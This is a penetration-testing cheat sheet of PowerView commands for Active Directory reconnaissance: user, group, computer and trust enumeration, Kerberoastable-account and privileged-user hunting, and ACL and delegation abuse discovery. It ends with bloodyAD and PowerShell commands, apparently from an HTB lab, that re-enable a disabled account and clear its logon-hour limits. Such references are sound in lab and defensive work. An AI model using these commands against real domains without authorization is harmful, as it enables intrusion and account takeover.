

## Common Commands

### User Enumeration
```powershell
Get-DomainUser                   # Get all users
Get-DomainUser -Identity jdoe    # Get info on specific user
Get-DomainUser -SPN              # Find Kerberoastable accounts
Get-DomainUser -AdminCount 1     # Find privileged users (adminCount=1)
```

### Computer Enumeration
```powershell
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -Unconstrained
```

### Group Enumeration
```powershell
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroup -AdminCount 1
```
### Domain Enumeration
```powershell
Get-Domain                      # Basic info about the domain
Get-DomainPolicy                # Password and Kerberos policy
Get-NetDomainController         # Get DCs
Get-NetForestTrust              # Enumerate trust relationships
```

### User Hunting
```powershell
Find-DomainUserLocation         # Find where users are logged in
Find-DomainShare                # List accessible shares
Find-InterestingDomainShare     # Find shares with sensitive info
Invoke-UserHunter               # Locate privileged users on machines
```

### ACL/Delegation Abuse
```powershell
Get-ObjectAcl -SamAccountName jdoe -ResolveGUIDs
Find-InterestingDomainAcl
Find-Delegation
```

### OU and GPO Enumeration
```powershell
Get-DomainOU
Get-DomainGPO
Get-DomainGPOLink
```

# Enable AD Account

```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -k remove uac javier.mmarshall -f **ACCOUNTDISABLE**
```

```powershell
Enable-ADAccount javier.mmarshall
```

# Change LogonHours

```powershell
Set-ADUser -Identity "javier.mmarshall" -Clear logonHours
```

```powershell
$logonHours = New-Object 'System.Byte[]' 21

0..20 | ForEach-Object { $logonHours[$_] = 0xFF }

Set-ADUser -Identity javier.mmarshall -Replace @{logonHours = $logonHours}
```

or
```
bloodyAD --host dc01.mirage.htb -d mirage.htb -k set object -v ///////////////////// --raw javier.mmarshall logonHours
```